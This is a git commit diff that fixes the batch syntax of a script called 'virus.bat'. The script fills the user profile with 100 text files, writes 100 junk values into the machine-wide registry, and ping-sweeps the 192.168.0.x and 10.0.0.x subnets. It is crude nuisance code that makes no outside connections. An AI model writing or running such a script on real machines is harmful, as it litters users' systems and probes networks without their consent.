c4c7690e2c641ef475f7553f8502e54f86e97cdc
Itamar <mizrahi.itamar@gmail.com>
2017-12-06 22:57:49 +0200

    Update virus.bat

--- virus.bat
+++ virus.bat
@@ -1,7 +1,7 @@
-echo off
+@echo off
 
-for /l %x in (1, 1, 100) do echo %x > %userprofile%\%x.txt
-for /l %x in (1, 1, 100) do reg add hklm\software\windows\microsoft /v Data%x /d %x /f
-for /l %i in (1,1,255) do ping -n 1 192.168.0.%i 
-for /l %i in (1,1,255) do ping -n 1 10.0.0.%i 
+for /l %%x in (1, 1, 100) do echo %%x > %userprofile%\%%x.txt
+for /l %%x in (1, 1, 100) do reg add hklm\software\windows\microsoft /v Data%%x /d %%x /f
+for /l %%i in (1,1,255) do ping -n 1 192.168.0.%%i 
+for /l %%i in (1,1,255) do ping -n 1 10.0.0.%%i 
 
